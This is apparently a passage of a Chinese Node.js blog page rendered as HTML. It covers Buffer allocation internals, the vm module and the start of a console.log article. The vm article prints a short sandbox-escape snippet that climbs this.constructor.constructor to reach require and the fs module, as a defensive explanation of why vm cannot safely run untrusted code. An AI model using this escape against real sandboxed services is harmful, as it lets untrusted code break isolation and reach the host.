class="comment">// 在buffer pool中进行分配</span></span><br><span class="line">  <span class="keyword">var</span> actual = allocPool.write(string, poolOffset, encoding);</span><br><span class="line">  <span class="comment">// 得到一个内存的视图view, 特殊说明: slice不进行copy，仅仅创建view</span></span><br><span class="line">  <span class="keyword">var</span> b = allocPool.slice(poolOffset, poolOffset + actual);</span><br><span class="line">  poolOffset += actual;</span><br><span class="line">  <span class="comment">// 校验poolOffset是8的整数倍</span></span><br><span class="line">  alignPool();</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pool的申请</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createPool</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  poolSize = Buffer.poolSize;</span><br><span class="line">  allocPool = createBuffer(poolSize, <span class="literal">true</span>);</span><br><span class="line">  poolOffset = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// node加载的时候，就会创建第一个buffer pool</span></span><br><span class="line">createPool();</span><br><span class="line"><span class="comment">// 校验poolOffset是8的整数倍</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alignPool</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Ensure aligned slices</span></span><br><span class="line">  <span class="keyword">if</span> (poolOffset &amp; <span class="number">0x7</span>) &#123;</span><br><span class="line">    poolOffset |= <span class="number">0x7</span>;</span><br><span class="line">    poolOffset++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-1-3-Buffer-TypeArray-Array"><a href="#3-1-3-Buffer-TypeArray-Array" class="headerlink" title="3.1.3 Buffer/TypeArray/Array"></a>3.1.3 Buffer/TypeArray/Array</h4><p>可用从一个现有的Buffer、TypeArray或Array中创建Buffer，内存不会共享，仅仅进行值的copy。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf1 = <span class="keyword">new</span> Buffer([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]);</span><br><span class="line"><span class="keyword">var</span> buf2 = <span class="keyword">new</span> Buffer(buf1);</span><br><span class="line"><span class="built_in">console</span>.log(buf1); <span class="comment">// &lt;Buffer 01 02 03 04 05&gt;</span></span><br><span class="line"><span class="built_in">console</span>.log(buf2); <span class="comment">// &lt;Buffer 01 02 03 04 05&gt;</span></span><br><span class="line">buf1[<span class="number">0</span>] = <span class="number">16</span></span><br><span class="line"><span class="built_in">console</span>.log(buf1); <span class="comment">// &lt;Buffer 10 02 03 04 05&gt;</span></span><br><span class="line"><span class="built_in">console</span>.log(buf2); <span class="comment">// &lt;Buffer 01 02 03 04 05&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上述示例就证明了buf1、buf2没有进行内存的共享，仅仅是值的copy，再从源码层面进行分析:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fromObject</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 当obj为Buffer时</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Buffer) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">const</span> b = allocate(obj.length);</span><br><span class="line">    obj.copy(b, <span class="number">0</span>, <span class="number">0</span>, obj.length);</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 当obj为TypeArray或Array时</span></span><br><span class="line">  <span class="keyword">if</span> (obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.buffer <span class="keyword">instanceof</span> <span class="built_in">ArrayBuffer</span> || <span class="string">'length'</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">return</span> fromArrayLike(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj.type === <span class="string">'Buffer'</span> &amp;&amp; <span class="built_in">Array</span>.isArray(obj.data)) &#123;</span><br><span class="line">      <span class="keyword">return</span> fromArrayLike(obj.data);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(kFromErrorMsg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数组或类数组，逐个进行值的copy</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fromArrayLike</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> length = obj.length;</span><br><span class="line">  <span class="keyword">const</span> b = allocate(length);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    b[i] = obj[i] &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-Buffer-alloc"><a href="#3-2-Buffer-alloc" class="headerlink" title="3.2 Buffer.alloc"></a>3.2 Buffer.alloc</h3><p>Buffer.alloc用于内存的分配，同时会对内存的旧数据进行覆盖，避免安全隐患的产生。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Buffer.alloc = <span class="function"><span class="keyword">function</span>(<span class="params">size, fill, encoding</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (size &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> createBuffer(size);</span><br><span class="line">  <span class="keyword">if</span> (fill !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">typeof</span> encoding === <span class="string">'string'</span> ?</span><br><span class="line">        createBuffer(size, <span class="literal">true</span>).fill(fill, encoding) :</span><br><span class="line">        createBuffer(size, <span class="literal">true</span>).fill(fill);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> createBuffer(size);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createBuffer</span>(<span class="params">size, noZeroFill</span>) </span>&#123;</span><br><span class="line">  flags[kNoZeroFill] = noZeroFill ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> ui8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(size);</span><br><span class="line">    <span class="built_in">Object</span>.setPrototypeOf(ui8, Buffer.prototype);</span><br><span class="line">    <span class="keyword">return</span> ui8;</span><br><span class="line">  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    flags[kNoZeroFill] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码有几个需要注意的点:</p>
+<h4 id="3-2-1-先申请后填充"><a href="#3-2-1-先申请后填充" class="headerlink" title="3.2.1 先申请后填充"></a>3.2.1 先申请后填充</h4><p>alloc先通过<code>createBuffer</code>申请一块内存，然后再进行填充，保证申请的内存全部用<code>fill</code>进行填充。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = Buffer.alloc(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line"><span class="built_in">console</span>.log(buf); <span class="comment">// &lt;Buffer 0b 0b 0b 0b 0b 0b 0b 0b 0b 0b&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="3-2-2-flags标示"><a href="#3-2-2-flags标示" class="headerlink" title="3.2.2 flags标示"></a>3.2.2 flags标示</h4><p><code>flags</code>用于标识默认的填充值是否为<code>0</code>，该值在javascript中设置，在c++中进行读取。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js</span></span><br><span class="line"><span class="keyword">const</span> binding = process.binding(<span class="string">'buffer'</span>);</span><br><span class="line"><span class="keyword">const</span> bindingObj = &#123;&#125;;</span><br><span class="line">...</span><br><span class="line">binding.setupBufferJS(Buffer.prototype, bindingObj);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> flags = bindingObj.flags;</span><br><span class="line"><span class="keyword">const</span> kNoZeroFill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// c++</span></span><br><span class="line"><span class="keyword">void</span> SetupBufferJS(<span class="keyword">const</span> FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  ...</span><br><span class="line">  Local&lt;<span class="built_in">Object</span>&gt; bObj = args[<span class="number">1</span>].As&lt;<span class="built_in">Object</span>&gt;();</span><br><span class="line">  ...</span><br><span class="line">  bObj-&gt;<span class="built_in">Set</span>(<span class="built_in">String</span>::NewFromUtf8(env-&gt;isolate(), <span class="string">"flags"</span>),</span><br><span class="line">    <span class="built_in">Uint32Array</span>::New(array_buffer, <span class="number">0</span>, fields_count));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="3-2-3-Uint8Array"><a href="#3-2-3-Uint8Array" class="headerlink" title="3.2.3 Uint8Array"></a>3.2.3 Uint8Array</h4><p><code>Uint8Array</code>是ES2015 TypeArray中的一种，可以在浏览器中创建二进制数据，这样就把浏览器、Node连接起来。</p>
+<h3 id="3-3-Buffer-allocUnSafe"><a href="#3-3-Buffer-allocUnSafe" class="headerlink" title="3.3 Buffer.allocUnSafe"></a>3.3 Buffer.allocUnSafe</h3><p>Buffer.allocUnSafe与Buffer.alloc的区别在于，前者是从采用<code>allocate</code>的策略，尝试从<code>buffer pool</code>中申请内存，而<code>buffer pool</code>是不会进行默认值填充的，所以这种行为是不安全的。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Buffer.allocUnsafe = <span class="function"><span class="keyword">function</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  assertSize(size);</span><br><span class="line">  <span class="keyword">return</span> allocate(size);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="3-4-Buffer-allocUnsafeSlow"><a href="#3-4-Buffer-allocUnsafeSlow" class="headerlink" title="3.4 Buffer.allocUnsafeSlow"></a>3.4 Buffer.allocUnsafeSlow</h3><p>Buffer.allocUnsafeSlow有两个大特点: 直接通过c++进行内存分配；不会进行旧值填充。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Buffer.allocUnsafeSlow = <span class="function"><span class="keyword">function</span>(<span class="params">size</span>) </span>&#123;</span><br><span class="line">  assertSize(size);</span><br><span class="line">  <span class="keyword">return</span> createBuffer(size, <span class="literal">true</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h2 id="4-结语"><a href="#4-结语" class="headerlink" title="4. 结语"></a>4. 结语</h2><p>字符串与Buffer之间存在较大的差距，同时二者又存在编码关系。通过Node，前端工程师已经深入到网络操作、文件操作等领域，对二进制数据的操作就显得非常重要，因此理解Buffer的诸多细节十分必要。</p>
+<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><a href="http://zhenhua-lee.github.io/node/buffer.html" target="_blank" rel="noopener">http://zhenhua-lee.github.io/node/buffer.html</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-03-07T06:45:23.000Z"><a href="/2018/03/07/Node.js_模块/浅析Node.js的vm模块以及运行不信任代码/">2018-03-07</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/03/07/Node.js_模块/浅析Node.js的vm模块以及运行不信任代码/">浅析Node.js的vm模块以及运行不信任代码</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>在一些系统中，我们希望给用户提供插入自定义逻辑的能力，除了 <code>RPC</code> 和 <code>REST</code> 之外，运行客户提供的代码也是比较常用的方法，好处是可以极大地减少在网络上的耗时。JavaScript 是一种非常流行而且容易上手的语言，因此，让用户用 JavaScript 来写自定义逻辑是一个不错的选择。下面我们介绍 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 提供的 <a href="https://nodejs.org/dist/latest-v7.x/docs/api/vm.html" target="_blank" rel="noopener">vm</a> 模块以及分析用它来运行不信任代码可能遇到的问题。</p>
+<h3 id="vm模块"><a href="#vm模块" class="headerlink" title="vm模块"></a>vm模块</h3><p>vm 模块是 Node.js 内置的核心模块，它能让我们编译 JavaScript 代码和在指定的环境中运行。请看下面例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 创建一个 vm.Script 实例, 编译要执行的代码</span></span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">'globalVar += 1; anotherGlobalVar = 1; '</span>);</span><br><span class="line"><span class="comment">// 2. 用于绑定到 context 的对象</span></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;<span class="attr">globalVar</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">// 3. 创建一个 context, 并且把 sandbox 这个对象绑定到这个环境, 作为全局对象</span></span><br><span class="line"><span class="keyword">const</span> contextifiedSandbox = vm.createContext(sandbox);</span><br><span class="line"><span class="comment">// 4. 运行上面编译的代码, context 是 contextifiedSandbox</span></span><br><span class="line"><span class="keyword">const</span> result = script.runInContext(contextifiedSandbox);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`sandbox === contextifiedSandbox ? <span class="subst">$&#123;sandbox === contextifiedSandbox&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// sandbox === contextifiedSandbox ? true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`sandbox: <span class="subst">$&#123;util.inspect(sandbox)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// sandbox: &#123; globalVar: 2, anotherGlobalVar: 1 &#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`result: <span class="subst">$&#123;util.inspect(result)&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// result: 1</span></span><br></pre></td></tr></table></figure>
+<p><code>vm.Script</code> 是一个类，用于创建代码实例，后面可以多次运行。</p>
+<p><code>vm.createContext(sandbox)</code> 用于 “contextify” 一个对象，根据 <a href="http://www.ecma-international.org/ecma-262/6.0/" target="_blank" rel="noopener">ECMAScript 2015 语言规范</a>，代码的执行需要一个 <a href="http://www.ecma-international.org/ecma-262/6.0/#sec-execution-contexts" target="_blank" rel="noopener">execution context</a>。这里的 “contextify”，就是把传进去的对象与 V8 的一个新的 <a href="https://github.com/v8/v8/wiki/Embedder" target="_blank" rel="noopener">context</a> 进行关联。这里所说的关联，我的理解是，这个 “contextified” 对象的属性将会成为那个 context 的全局属性，同时，在 context 下运行代码时产生的全局属性也会成为这个 “contextified” 对象的属性。</p>
+<p><code>script.runInContext(contextifiedSandbox)</code> 就是使代码在 <code>contextifiedSandbox</code> 这个 context 中运行，从上面的输出可以看到，代码运行后，<code>contextifiedSandbox</code> 里面的属性的值已经被改变了，运行结果是最后一个表达式的值。</p>
+<p>除了上面几个接口之外，vm 模块还有一些更便捷的接口，例如 <code>vm.runInContext(code, contextifiedSandbox[, options])</code>，<code>vm.runInNewContext(code[, sandbox][, options])</code>等，详细可看<a href="https://nodejs.org/api/vm.html" target="_blank" rel="noopener">文档</a>。</p>
+<h3 id="外层如何得到代码运行结果"><a href="#外层如何得到代码运行结果" class="headerlink" title="外层如何得到代码运行结果"></a>外层如何得到代码运行结果</h3><p>我们用 vm 运行代码的时候很可能需要得到一些结果，从上面的例子中可以看到，我们可以通过把结果作为最后一个表达式的值传给外层，或者作为<code>context</code> 的属性给外层使用，这在同步代码里没有问题，但是假如结果需要依赖里面的异步操作呢？这时，我们可以通过在 <code>context</code> 里放一个回调函数。 下面是例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;<span class="attr">globalVar</span>: <span class="number">1</span>, <span class="attr">setTimeout</span>: setTimeout, <span class="attr">cb</span>: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;&#125;;</span><br><span class="line">vm.createContext(sandbox);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`</span></span><br><span class="line"><span class="string">    setTimeout(function()&#123;</span></span><br><span class="line"><span class="string">        globalVar++;</span></span><br><span class="line"><span class="string">        cb("async result");</span></span><br><span class="line"><span class="string">    &#125;, 1000);</span></span><br><span class="line"><span class="string">`</span>,&#123;&#125;);</span><br><span class="line">script.runInContext(sandbox);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`globalVar: <span class="subst">$&#123;sandbox.globalVar&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// globalVar: 1</span></span><br><span class="line"><span class="comment">// async result</span></span><br></pre></td></tr></table></figure>
+<h3 id="代码运行时间限制"><a href="#代码运行时间限制" class="headerlink" title="代码运行时间限制"></a>代码运行时间限制</h3><p><code>script.runInContext(contextifiedSandbox[, options])</code> 方法有一个 <code>timeout</code> 选项可以设定代码的运行时间，如果超过时间就会抛出错误，请看下面例子：　</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> contextifiedSandbox = vm.createContext(sandbox);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">'while(true)&#123;&#125;'</span>);</span><br><span class="line"><span class="keyword">const</span> result = script.runInContext(contextifiedSandbox, &#123;<span class="attr">timeout</span>: <span class="number">1000</span>&#125;);</span><br><span class="line"><span class="comment">// const result = script.runInContext(contextifiedSandbox, &#123;timeout: 1000&#125;);</span></span><br><span class="line"><span class="comment">//                       ^</span></span><br><span class="line"><span class="comment">// Error: Script execution timed out.</span></span><br></pre></td></tr></table></figure>
+<p>再试试异步代码，</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;<span class="attr">globalVar</span>: <span class="number">1</span>, <span class="attr">setTimeout</span>: setTimeout, <span class="attr">cb</span>: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;&#125;;</span><br><span class="line">vm.createContext(sandbox);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`</span></span><br><span class="line"><span class="string">    setTimeout(function()&#123;</span></span><br><span class="line"><span class="string">        globalVar++;</span></span><br><span class="line"><span class="string">        cb("async result");</span></span><br><span class="line"><span class="string">    &#125;, 1000);</span></span><br><span class="line"><span class="string">    globalVar;</span></span><br><span class="line"><span class="string">`</span>,&#123;&#125;);</span><br><span class="line"><span class="keyword">const</span> result = script.runInContext(sandbox, &#123;<span class="attr">timeout</span>: <span class="number">500</span>&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`result: <span class="subst">$&#123;result&#125;</span>`</span>);</span><br><span class="line"><span class="comment">// result: 1</span></span><br><span class="line"><span class="comment">// async result</span></span><br></pre></td></tr></table></figure>
+<p>没有错误抛出，也就是说，这个选项并不能限制异步代码的运行时间，那应该怎么去限制所有代码的执行时间呢，目前好像没有接口终止 vm 代码的运行，如果有异步代码长时间不结束，很容易造成内存泄露，目前可行的方案是使用子进程去运行代码，如果超过限定时间还没有结果，就杀掉该子进程，另外，使用子进程还可以更方便地对内存等资源进行限制。</p>
+<h3 id="定制-context-与安全问题"><a href="#定制-context-与安全问题" class="headerlink" title="定制 context 与安全问题"></a>定制 context 与安全问题</h3><p>在一个全新的 <a href="https://github.com/v8/v8/wiki/Embedder" target="_blank" rel="noopener">V8 context</a> 里运行代码，里面包含了语言规范规定的内置的一些函数和对象，如果我们想要一些语言规范之外的功能或者模块，我们需要把相应对象放到与这个 context 关联的对象里，例如在上面例子中的这句代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = &#123;<span class="attr">globalVar</span>: <span class="number">1</span>, <span class="attr">setTimeout</span>: setTimeout, <span class="attr">cb</span>: <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(result);</span><br><span class="line">&#125;&#125;;</span><br></pre></td></tr></table></figure>
+<p><code>setTimeout</code> 不是语言规范规定的内置函数， context 本身不提供，所以我们需要通过关联的对象传进去。</p>
+<p>然而，当我们把一些模块功能提供给 context 的时候，也同时带入了更多的安全隐患，请看下面来自例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">'util'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">'vm'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;&#125;;</span><br><span class="line">vm.createContext(sandbox);</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.Script(<span class="string">`</span></span><br><span class="line"><span class="string">    // sandbox 的 constructor 是外层的 Object 类</span></span><br><span class="line"><span class="string">    // Object 类的 constructor 是外层的 Function 类</span></span><br><span class="line"><span class="string">    const OutFunction = this.constructor.constructor;</span></span><br><span class="line"><span class="string">    // 于是, 利用外层的 Function 构造一个函数就可以得到外层的全局 this</span></span><br><span class="line"><span class="string">    const OutThis = (OutFunction('return this;'))();</span></span><br><span class="line"><span class="string">    // 得到 require</span></span><br><span class="line"><span class="string">    const require = OutThis.process.mainModule.require;</span></span><br><span class="line"><span class="string">    // 试试</span></span><br><span class="line"><span class="string">    require('fs');</span></span><br><span class="line"><span class="string">`</span>,&#123;&#125;);</span><br><span class="line"><span class="keyword">const</span> result = script.runInContext(sandbox);</span><br><span class="line"><span class="built_in">console</span>.log(result === <span class="built_in">require</span>(<span class="string">'fs'</span>));</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+<p>显然，定制 context 的时候，任何一个传进去的对象或者函数都可能带来上面的问题，安全问题真的有很多工作需要做。</p>
+<p>Github 上有一些开源的模块用于运行不信任代码，例如 <a href="https://github.com/gf3/sandbox" target="_blank" rel="noopener">sandbox</a>，<a href="https://github.com/patriksimek/vm2" target="_blank" rel="noopener">vm2</a>，<a href="https://github.com/asvd/jailed" target="_blank" rel="noopener">jailed</a>等。查看这些项目的 issue 可以发现，sandbox 和 jailed 都可以用类似上面的方法突破限制，而 vm2 对这方面做了防护，其它方面也做了更多的安全工作，相对安全些。</p>
+<p>生产中可以考虑在子进程中运行 vm2， 然后增加更低层的安全限制， 例如限制进程的权限和使用 <a href="https://wiki.archlinux.org/index.php/cgroups" target="_blank" rel="noopener">cgroups</a> 进行 IO，内存等资源限制，这里不详细讨论。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文通过几个例子介绍了 Node.js 的 vm 模块以及使用 vm 模块运行不信任代码可能遇到的问题，并且对安全问题给出了一些建议。</p>
+<h3 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h3><p><a href="https://segmentfault.com/a/1190000008284054" target="_blank" rel="noopener">https://segmentfault.com/a/1190000008284054</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-02-25T14:16:53.000Z"><a href="/2018/02/25/Node.js_IO/console模块解读之实现一个console.log/">2018-02-25</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2018/02/25/Node.js_IO/console模块解读之实现一个console.log/">console模块解读之实现一个console.log</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h3 id="console是同步的还是异步的"><a href="#console是同步的还是异步的" class="headerlink" title="console是同步的还是异步的?"></a>console是同步的还是异步的?</h3><p>console.log既不是总是同步的，也不总是异步的。是否为同步取决于链接的是什么流以及操作系统是Windows还是POSIX:</p>
+<p>注意: 同步写将会阻塞事件循环直到写完成。 有时可能一瞬间就能写到一个文件，但当系统处于高负载时，管道的接收端可能不会被读取、缓慢的终端或文件系统，因为事件循环被阻塞的足够频繁且足够长的时间，这些可能会给系统性能带来消极的影响。当你向一个交互终端会话写时这可能不是个问题，但当生产日志到进程的输出流时要特别留心。</p>
+<ul>
